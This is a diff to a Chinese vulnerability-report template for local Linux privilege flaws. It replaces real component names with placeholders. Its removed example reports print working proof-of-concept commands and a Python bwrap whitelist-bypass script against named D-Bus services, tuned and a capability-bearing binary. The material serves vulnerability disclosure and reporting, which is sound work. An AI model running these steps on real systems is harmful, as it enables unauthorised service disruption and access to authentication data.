@@ -12,17 +12,17 @@
 
 **单个方法**：使用 `{接口名}.{方法名}`
 ```
-org.ukui.UniauthBackend.GetLastLoginUser 方法存在未授权访问漏洞
+{接口名}.{方法名} 方法存在未授权访问漏洞
 ```
 
 **单个二进制**：使用 `{组件名} {二进制名}`
 ```
-libbox1 组件 boxumount 存在弱路径校验任意卸载漏洞
+{组件名} {二进制名} 存在弱路径校验任意卸载漏洞
 ```
 
 **多个方法/二进制**：使用 `{服务名/组件名}`
 ```
-org.ukui.UniauthBackend D-Bus 服务存在白名单绕过漏洞，影响所有受保护接口
+{服务名} D-Bus 服务存在白名单绕过漏洞，影响所有受保护接口
 ```
 
 ---
@@ -102,7 +102,7 @@ org.ukui.UniauthBackend D-Bus 服务存在白名单绕过漏洞，影响所有�
 - {同类 sink 排查 / 其他门控或触发路径 / 线上复验建议 …}
 ```
 
-> **字段映射（旧版 → 新版）**：`漏洞信息` → `目标与漏洞信息`（等级/CWE/CVSS/权限影响同表）；`漏洞概述（内部）` → `漏洞描述`；`漏洞概述（外部）` → `漏洞描述 · 对外脱敏描述`；`漏洞原因` → `漏洞原理`；`漏洞利用的可能性` + `漏洞触发的前提条件` + `实际危害分析` → `利用条件与危害`；`复现步骤 / POC 脚本` → `验证情况` + `PoC 验证`。下方「填写示例 1–5」为**旧版示例**（字段较旧、篇幅较长），仅作对照，**勿照搬其结构**。
+> **字段映射（旧版 → 新版）**：`漏洞信息` → `目标与漏洞信息`（等级/CWE/CVSS/权限影响同表）；`漏洞概述（内部）` → `漏洞描述`；`漏洞概述（外部）` → `漏洞描述 · 对外脱敏描述`；`漏洞原因` → `漏洞原理`；`漏洞利用的可能性` + `漏洞触发的前提条件` + `实际危害分析` → `利用条件与危害`；`复现步骤 / POC 脚本` → `验证情况` + `PoC 验证`。
 
 ---
 
@@ -145,7 +145,7 @@ org.ukui.UniauthBackend D-Bus 服务存在白名单绕过漏洞，影响所有�
 | 删除审计日志 | AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L | 3.3 | 仅 audit 日志可恢复性受损 |
 | 解绑认证设备 | AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N | 4.4 | 不影响系统可用性 |
 | 未授权 DoS | AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H | 5.5 | 纯 DoS |
-| 信息泄露（非敏感） | AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N | 2.3 | 低影响 |
+| 信息泄露（非敏感） | AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N | 3.3 | 低影响 |
 | 不可信文件 → 用户级命令执行（同权限域） | AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N | 6.6 | 以登录用户权限执行、不可越权；需受害者处理恶意文件/触发操作 |
 | 同域接口篡改用户数据（攻击者=同机受限进程） | AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N | 5.5 | 不越权，影响限于该用户的数据完整性 |
 | 对等 / 抽象套接字跨用户调用（服务以 user 运行） | AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N | 4.4 | 用户↔用户越界、非 root；本地越权**一律 S:U**（硬性规则 7）。**C/I 以实际证据为准**：确有数据可读 / 状态真被改才取 H（`C:H/I:H` = 7.1）；返回空 `[]` 或 `issuccessful:false` → 取 `C:N/I:N/A:N`（=0.0，**不构成漏洞**） |
@@ -172,8 +172,8 @@ org.ukui.UniauthBackend D-Bus 服务存在白名单绕过漏洞，影响所有�
 
 ### 硬性规则
 
-1. **每个维度必须写依据**：在报告的"CVSS 评分依据"节中，每个维度用一句话解释为什么取该值
-2. **评分前必须执行步骤 0**：确认该操作默认需要 root，否则不构成漏洞
+1. **每个维度必须写依据**：在报告「CVSS 依据」一行中给出各维度的理由（"向量 + 一行依据"格式，不逐维度成段）
+2. **评分前必须先做权限基线**（判定流程步骤 0 / PoC 的 Boundary 阶段）：确认该操作默认需要 root，否则不构成漏洞
 3. **C/I/A 必须系统级验证**：不依赖命令返回值，用 md5sum / mount / systemctl status 等独立命令确认
 4. **无法确定 → 取低档**：如果某维度只能推测而无法实际验证，取更低一档
 5. **危害等级与分数对应**：严重(9.0+) / 高危(7.0-8.9) / 中危(4.0-6.9) / 低危(0.1-3.9)
@@ -183,463 +183,69 @@ org.ukui.UniauthBackend D-Bus 服务存在白名单绕过漏洞，影响所有�
 
 ---
 
-## 填写示例
+## 填写示例（唯一示范：全部占位符，符合本文件全部自身规则）
 
-### 示例 1：D-Bus 未授权冻结服务
+> 组件/服务/方法/路径一律用占位符；本示例即「9 节结构 + 正文 ≤70 行 + 基线非交互 + CVSS 脚本复核 + 六阶段压缩为编号列表」的合规样板。**示例中不得出现真实组件名、厂商名或真实漏洞细节。**
 
 ```markdown
 # vuln-001
 
 ## 漏洞标题
 
-com.kylin.ProcessManagerDaemon.SetSystemdUnitFreezelimit 方法存在未授权访问漏洞
+{服务名} D-Bus 服务存在未授权访问漏洞，影响所有特权接口
 
-## 漏洞信息
+## 目标与漏洞信息
 
-| 字段 | 内容 |
-|------|------|
-| 漏洞编号 | vuln-001 |
-| 危害等级 | 中危 |
-| 攻击向量 (CVSS 3.1) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H |
-| 评分 (CVSS 3.1) | 6.1 |
-| 挖掘人员 | {姓名} |
-| CWE ID | CWE-862 |
-| CWE 名称 | 缺失授权 |
+| 项目 | 值 |
+|------|-----|
+| 受影响组件 | {组件名} {版本} |
+| 受影响路径 | {二进制/配置}（md5 {md5}）|
+| 汇点 | {root 特权操作} @ {二进制} |
+| 入口 | D-Bus 方法 {接口}.{方法} @ {对象路径}（系统总线）|
+| 运行身份 | 守护进程 uid=0(root)；攻击者 {用户}(uid={uid}) |
+| 归属校验 | {dpkg -S / 应用清单} → 归属本组件 |
+| 危害等级 | {严重/高危/中危/低危} |
+| CWE | CWE-{编号} {中文名} |
+| CVSS 3.1 | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:{x}/I:{x}/A:{x}` = {分数}（`cvss31_calc.py` 复核）|
+| 权限影响 | 跨权限域（可越权）|
 
-### CVSS 评分依据
+## 漏洞描述
 
-- **AV:L**：需要本地 shell 访问
-- **AC:L**：单条 busctl 命令即可，无特殊条件
-- **PR:L**：普通用户即可
-- **UI:N**：无需用户交互
-- **S:U**：影响范围不超出当前安全域
-- **C:N**：冻结服务不直接泄露数据
-- **I:L**：可修改服务状态（冻结/解冻），但无法写入任意文件
-- **A:H**：冻结关键服务（auditd、cron 等）可导致系统功能严重受损
+{组件名} 存在{漏洞类型}漏洞，漏洞源于{一句话根因}；{攻击者身份}可经{攻击向量}{利用方式}，导致{危害}。
 
-## 漏洞概述（内部）
+**对外脱敏描述**：{1–2 句标准漏洞语言；不出现内部函数名/字段偏移/私有接口名。}
 
-com.kylin.ProcessManagerDaemon 服务的 SetSystemdUnitFreezelimit 方法存在未授权访问漏洞，
-漏洞源于该 D-Bus 方法未实施有效的调用者身份认证。任意本地普通用户可通过 D-Bus 直接调用该方法，
-冻结或解冻任意 systemd 服务。攻击者可利用此漏洞冻结关键安全服务（KYSEC、auditd、firewalld）
-使安全防护失效，或冻结基础服务（cron、NetworkManager）造成拒绝服务。
+**CVSS 依据**：AV:L {理由} · AC:L {理由} · PR:L {理由} · UI:N {理由} · S:U {理由} · C/I/A:{x}{x}{x} {理由}。
 
-## 漏洞概述（外部）
+## 漏洞原理
 
-com.kylin.ProcessManagerDaemon 服务存在未授权访问漏洞。本地攻击者可通过 D-Bus 接口
-冻结任意系统服务，导致安全防护机制失效或系统拒绝服务。
+{根因分析（配置/代码要点）+ 调用链：攻击者入口 → 中间层 → root 汇点。}
 
-## 漏洞原因
+## 利用条件与危害
 
-SetSystemdUnitFreezelimit 方法未集成 Polkit 认证检查，且 D-Bus XML Policy 未限制调用者身份。
-任何可连接 system bus 的本地用户均可调用该方法。
+- **可能性**：{触发难度 / 是否需交互 / 是否需非默认配置 / 可重复性}。
+- **前提条件**：{条件 ✅/❌ — 依据}（逐条一行）。
+- **实际危害**：{行为 → 能力 → ✅已验证 / ⚠️可达未执行（破坏性）/ ❌未验证}。
 
-## 复现步骤 / POC 脚本
+## 验证情况
 
-### 测试环境
+1. **Presence**：{命令} → {关键响应} → {结论}。
+2. **Introspection**：{命令} → {接口/方法/策略枚举结果}。
+3. **Reachability**：`id` → uid={uid}；{调用命令} → {响应（无 AccessDenied）}。
+4. **Boundary（非交互基线）**：{pkcheck --process $$ / login1 CanReboot / 自建文件属主对照} → {本应拦截的证据}。
+5. **Impact**：{调用命令} → {系统级证据：marker + owner uid / 状态变化}；破坏性方法标"可达但不执行（系统稳定性）"。
+6. **Cleanup**：{还原配置 / 删除标记的回显}。
 
-- 目标系统：Kylin V11
-- 测试方式：Agent on Target
-- 测试用户：普通用户（无 sudo 权限）
+## PoC 验证
 
-### POC
-
-\```bash
-# 步骤 0：权限基线 — 确认普通用户不能直接操作 systemd 服务
-systemctl freeze cron.service 2>&1
-# Interactive authentication required. → 需要 root
-
-# 步骤 1：查看 D-Bus 接口
-busctl introspect com.kylin.ProcessManagerDaemon /com/kylin/ProcessManagerDaemon
-
-# 步骤 2：普通用户调用冻结 cron 服务
-busctl --system call com.kylin.ProcessManagerDaemon \
-  /com/kylin/ProcessManagerDaemon \
-  com.kylin.ProcessManagerDaemon \
-  SetSystemdUnitFreezelimit "sb" "cron.service" true
-
-# 步骤 3：系统级验证
-systemctl status cron.service
-# Active: active (frozen) since ...  ← 确认已冻结
-
-# 步骤 4：恢复
-busctl --system call com.kylin.ProcessManagerDaemon \
-  /com/kylin/ProcessManagerDaemon \
-  com.kylin.ProcessManagerDaemon \
-  SetSystemdUnitFreezelimit "sb" "cron.service" false
-\```
+`vuln-001/poc.py` 末行结论：`漏洞存在`（退出码 0）。关键系统级证据：{一条}。
 
 ## 修复建议
 
-1. 添加 Polkit 认证：为该方法关联 Polkit action，要求 auth_admin 权限
-2. D-Bus XML Policy 限制：在 /etc/dbus-1/system.d/ 中仅允许 root 调用
-```
+1. {具体可操作的修复措施 1}
+2. {具体可操作的修复措施 2}
 
-### 示例 2：D-Bus + PolicyKit 未授权
+## 进一步分析建议
 
-```markdown
-# vuln-002
-
-## 漏洞标题
-
-com.redhat.tuned.switch_profile 方法存在未授权 profile 切换漏洞
-
-## 漏洞信息
-
-| 字段 | 内容 |
-|------|------|
-| 漏洞编号 | vuln-002 |
-| 危害等级 | 高危 |
-| 攻击向量 (CVSS 3.1) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H |
-| 评分 (CVSS 3.1) | 7.1 |
-| 挖掘人员 | {姓名} |
-| CWE ID | CWE-268 |
-| CWE 名称 | 权限配置不当 |
-
-### CVSS 评分依据
-
-- **AV:L**：需要本地 shell 访问
-- **AC:L**：单条 busctl 命令，无特殊条件
-- **PR:L**：普通用户即可
-- **UI:N**：无需用户交互
-- **S:U**：仅影响本系统
-- **C:N**：切换 profile 不泄露数据
-- **I:H**：可将系统性能策略改为任意 profile，严重影响系统运行状态
-- **A:H**：切换到不适用的 profile（如省电模式）可导致服务中断
-
-## 漏洞概述（内部）
-
-tuned 组件的 switch_profile D-Bus 方法存在权限配置不当漏洞，漏洞源于其对应的 Polkit action
-com.redhat.tuned.switch_profile 在活跃会话维度配置为 allow_active=yes。本地活跃会话用户
-无需提供管理员密码即可通过 D-Bus 调用该方法，将系统性能调优策略切换到任意指定 profile。
-攻击者可精准选择目标 profile（如将服务器从虚拟化优化 profile 切换到省电 profile），
-直接导致系统性能严重下降。
-
-## 漏洞概述（外部）
-
-tuned 组件存在权限配置不当漏洞。本地攻击者可在无需认证的情况下切换系统性能调优策略，
-导致系统性能严重下降或服务中断。
-
-## 漏洞原因
-
-com.redhat.tuned.switch_profile 的 Polkit 策略配置 allow_active=yes，允许活跃会话用户
-无需管理员密码即可调用。该操作为系统级配置变更（modify.system），应配置为 auth_admin。
-
-## 复现步骤 / POC 脚本
-
-### 测试环境
-
-- 目标系统：Kylin V11
-- 测试方式：Agent on Target
-- 测试用户：普通用户（无 sudo 权限）
-
-### POC
-
-\```bash
-# 步骤 0：权限基线 — 确认默认需要认证
-pkaction --action-id com.redhat.tuned.switch_profile --verbose | grep implicit
-# implicit active: yes  ← 未授权，是漏洞
-
-# 步骤 1：查看当前 profile
-busctl call com.redhat.tuned /Tuned com.redhat.tuned.control active_profile
-
-# 步骤 2：普通用户尝试切换
-busctl call com.redhat.tuned /Tuned com.redhat.tuned.control switch_profile s "powersave"
-
-# 步骤 3：系统级验证
-tuned-adm active
-# Current active profile: powersave  ← 确认切换成功
-
-# 步骤 4：恢复
-busctl call com.redhat.tuned /Tuned com.redhat.tuned.control switch_profile s "balanced"
-\```
-
-## 修复建议
-
-1. 修改 switch_profile 策略：将 `<allow_active>` 从 `yes` 修改为 `auth_admin`
-2. 统一安全级别：auto_profile 与 switch_profile 共享后端实现，两者的安全级别应保持一致
-```
-
-### 示例 3：D-Bus bwrap 白名单绕过
-
-```markdown
-# vuln-003
-
-## 漏洞标题
-
-org.ukui.UniauthBackend D-Bus 服务存在白名单绕过漏洞
-
-## 漏洞信息
-
-| 字段 | 内容 |
-|------|------|
-| 漏洞编号 | vuln-003 |
-| 危害等级 | 高危 |
-| 攻击向量 (CVSS 3.1) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N |
-| 评分 (CVSS 3.1) | 7.8 |
-| 挖掘人员 | {姓名} |
-| CWE ID | CWE-287 |
-| CWE 名称 | 认证绕过 |
-
-### CVSS 评分依据
-
-- **AV:L**：需要本地 shell 访问
-- **AC:L**：bwrap 为系统自带工具，利用无额外条件
-- **PR:L**：普通用户即可
-- **UI:N**：无需用户交互
-- **S:U**：仅影响本系统
-- **C:H**：可获取登录用户、RSA 公钥、认证配置等敏感信息（影响 30+ 个方法）
-- **I:H**：可修改认证配置、设置快速登录用户
-- **A:N**：无直接可用性影响
-
-## 漏洞概述（内部）
-
-org.ukui.UniauthBackend D-Bus 服务存在白名单绕过漏洞，影响所有受保护接口（共 30+ 个方法）。
-漏洞源于该服务的访问控制基于 /proc/PID/cmdline 的 argv[0] 字符串匹配，攻击者可通过
-bubblewrap 将任意二进制（如 python3）映射到白名单路径，绕过双重安全检查
-（limit control + ensureTrustedCaller），以白名单进程身份调用所有受保护方法。
-
-## 漏洞概述（外部）
-
-org.ukui.UniauthBackend D-Bus 服务存在认证绕过漏洞。本地攻击者可通过 bubblewrap
-绕过进程白名单检查，调用受保护的 D-Bus 方法获取敏感信息或修改认证配置。
-
-## 漏洞原因
-
-ensureTrustedCaller 方法通过读取 /proc/PID/cmdline 的 argv[0] 与白名单比对来验证调用者身份。
-但 /proc/PID/cmdline 反映的是进程启动时的 argv[0]，可被 bubblewrap 的 --bind 功能伪造。
-应改用 /proc/PID/exe 读取真实二进制路径。
-
-## 复现步骤 / POC 脚本
-
-### 测试环境
-
-- 目标系统：Kylin V11
-- 测试方式：Agent on Target
-- 测试用户：普通用户
-
-### POC
-
-\```python
-#!/usr/bin/env python3
-import subprocess
-import os
-import tempfile
-
-WHITELIST_EXE = "/usr/bin/bioauth"
-PYTHON3 = "/usr/bin/python3"
-
-EVIL_SCRIPT = '''
-import dbus
-bus = dbus.SystemBus()
-proxy = bus.get_object("org.ukui.UniauthBackend", "/org/ukui/UniauthBackend")
-iface = dbus.Interface(proxy, "org.ukui.UniauthBackend")
-print(f"[+] GetLastLoginUser: {iface.GetLastLoginUser()}")
-print(f"[+] getMaxFailedTimes: {iface.getMaxFailedTimes()}")
-'''
-
-with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
-    f.write(EVIL_SCRIPT)
-    script_path = f.name
-
-try:
-    subprocess.run([
-        "bwrap", "--ro-bind", "/", "/",
-        "--bind", "/run", "/run", "--clearenv",
-        "--bind", PYTHON3, WHITELIST_EXE,
-        "--", WHITELIST_EXE, script_path
-    ])
-finally:
-    os.unlink(script_path)
-\```
-
-## 修复建议
-
-1. 改用 /proc/PID/exe 读取真实二进制路径，而非 argv[0]
-2. 增加二进制哈希校验，防止伪造
-3. 使用 AppArmor/SELinux 限制 D-Bus 调用者
-```
-
-### 示例 4：SUID 提权
-
-```markdown
-# vuln-004
-
-## 漏洞标题
-
-{组件名} {二进制名} 存在 SUID 命令注入提权漏洞
-
-## 漏洞信息
-
-| 字段 | 内容 |
-|------|------|
-| 漏洞编号 | vuln-004 |
-| 危害等级 | 高危 |
-| 攻击向量 (CVSS 3.1) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
-| 评分 (CVSS 3.1) | 7.8 |
-| 挖掘人员 | {姓名} |
-| CWE ID | CWE-78 |
-| CWE 名称 | OS 命令注入 |
-
-### CVSS 评分依据
-
-- **AV:L**：需要本地 shell 访问
-- **AC:L**：无需特殊条件即可触发
-- **PR:L**：普通用户即可
-- **UI:N**：无需用户交互
-- **S:U**：仅影响当前安全域
-- **C:H**：可读取任意文件（/etc/shadow 等）
-- **I:H**：可写入任意文件（/etc/passwd 等）
-- **A:H**：可执行任意命令，完全影响系统可用性
-
-## 漏洞概述（内部）
-
-{组件名} 的 {二进制名} 存在 SUID 命令注入提权漏洞，漏洞源于该二进制设置了 SUID root 权限
-且 {具体函数} 未对用户输入的 {参数} 做充分校验。攻击者可通过构造恶意参数注入系统命令，
-以 root 权限执行任意操作，实现从普通用户到 root 的本地提权。
-
-## 漏洞概述（外部）
-
-{组件名} 存在本地提权漏洞。该组件中的 SUID 程序未正确校验用户输入，
-本地攻击者可利用此漏洞以 root 权限执行任意命令。
-
-## 漏洞原因
-
-{二进制名} 设置了 SUID root 位，其 {具体函数} 在处理用户输入时将 {参数} 直接传递给
-system()/popen()/exec() 等函数而未做过滤。SUID 程序以文件属主（root）权限运行，
-导致注入的命令同样以 root 权限执行。
-
-关键代码路径：
-- {二进制路径} (SUID root, owner: root)
-- 调用链：main → {函数A} → {函数B} → system({用户输入})
-
-## 复现步骤 / POC 脚本
-
-### 测试环境
-
-- 目标系统：Kylin V11
-- 测试方式：本地测试
-- 测试用户：普通用户
-
-### POC
-
-\```bash
-# 步骤 0：权限基线
-id  # uid=1000(cl)，确认非 root
-whoami  # cl
-cat /etc/shadow 2>&1 | head -1  # Permission denied → 确认需要 root
-
-# 步骤 1：功能识别
-file /usr/bin/<binary>
-# ELF 64-bit, SUID, ...
-strings /usr/bin/<binary> | grep -iE 'exec|system|popen|/bin/sh'
-
-# 步骤 2：可达性 — 以普通用户身份执行
-id  # 确认 uid=1000(cl)
-/usr/bin/<binary> "<payload>"
-
-# 步骤 3：系统级验证
-id  # 对比步骤 0：输出显示 uid=0(root) → 提权成功
-md5sum /etc/shadow  # 确认文件内容与利用输出一致
-
-# 步骤 4：权限对比
-# 普通用户通过 SUID 程序获得了 root 级命令执行能力
-\```
-
-## 修复建议
-
-1. 移除不必要的 SUID 位：`chmod u-s /usr/bin/<binary>`
-2. 改用 execve() 替代 system()，避免 shell 解析
-3. 对用户输入参数做严格白名单校验
-4. 如确实需要特权操作，使用 capabilities 替代 SUID，只授予最小能力
-```
-
-### 示例 5：文件能力漏洞
-
-```markdown
-# vuln-005
-
-## 漏洞标题
-
-libbox1 组件 boxumount 存在弱路径校验任意卸载漏洞
-
-## 漏洞信息
-
-| 字段 | 内容 |
-|------|------|
-| 漏洞编号 | vuln-005 |
-| 危害等级 | 高危 |
-| 攻击向量 (CVSS 3.1) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H |
-| 评分 (CVSS 3.1) | 7.1 |
-| 挖掘人员 | {姓名} |
-| CWE ID | CWE-269 |
-| CWE 名称 | 权限配置不当 |
-
-### CVSS 评分依据
-
-- **AV:L**：需要本地 shell 访问
-- **AC:L**：直接执行二进制即可，无额外条件
-- **PR:L**：普通用户即可
-- **UI:N**：无需用户交互
-- **S:U**：仅影响本系统
-- **C:N**：卸载操作不泄露数据
-- **I:H**：可卸载任意挂载点（包括系统关键挂载点）
-- **A:H**：卸载关键挂载点可导致系统崩溃或数据不可用
-
-## 漏洞概述（内部）
-
-libbox1 组件 boxumount 存在弱路径校验任意卸载漏洞，漏洞源于该二进制具有
-cap_chown、cap_dac_override、cap_dac_read_search、cap_fowner、cap_sys_admin
-五种高危能力，且未对卸载目标路径做严格校验。普通用户可通过该二进制绕过权限检查，
-卸载任意挂载点，导致系统不稳定或拒绝服务。
-
-## 漏洞概述（外部）
-
-libbox1 组件存在权限配置不当漏洞。该组件中的 boxumount 程序被授予了过高权限，
-本地攻击者可通过该程序卸载任意挂载点，导致系统拒绝服务。
-
-## 漏洞原因
-
-boxumount 被授予了 cap_sys_admin 等五种高危能力（cap_chown,cap_dac_override,
-cap_dac_read_search,cap_fowner,cap_sys_admin=ep），这些能力允许二进制绕过文件权限检查
-并执行挂载管理操作。同时 boxumount 未对用户传入的挂载点路径做白名单校验，
-导致普通用户可以卸载任意挂载点。
-
-## 复现步骤 / POC 脚本
-
-### 测试环境
-
-- 目标系统：Kylin V11
-- 测试方式：本地测试
-- 测试用户：普通用户
-
-### POC
-
-\```bash
-# 步骤 0：权限基线
-id  # uid=1000(cl)，确认非 root
-mount | grep /data  # /dev/sdb1 on /data ... 挂载点存在
-umount /data 2>&1  # umount: only root can do that → 确认需要 root
-
-# 步骤 1：能力识别
-getcap /usr/bin/boxumount
-# /usr/bin/boxumount cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_admin=ep
-
-# 步骤 2：可达性 — 普通用户执行
-id  # 确认 uid=1000(cl)
-boxumount /data
-
-# 步骤 3：系统级验证
-mount | grep /data  # 预期空 → /data 已卸载
-ls /data  # 目录为空
-
-# 步骤 4：权限对比
-# 普通用户通过 capabilities 绕过了权限检查，成功卸载了需要 root 的挂载点
-\```
-
-## 修复建议
-
-1. 移除不必要的 capabilities：boxumount 不需要 cap_chown、cap_fowner 等能力，仅保留所需的最小能力集
-2. 添加严格的路径白名单校验：只允许卸载预设的挂载点
-3. 使用 sudo 配合特定命令替代 capabilities，实现更细粒度的权限控制
+- {同类 sink 排查 / 其他触发路径 / 线上复验建议}
 ```
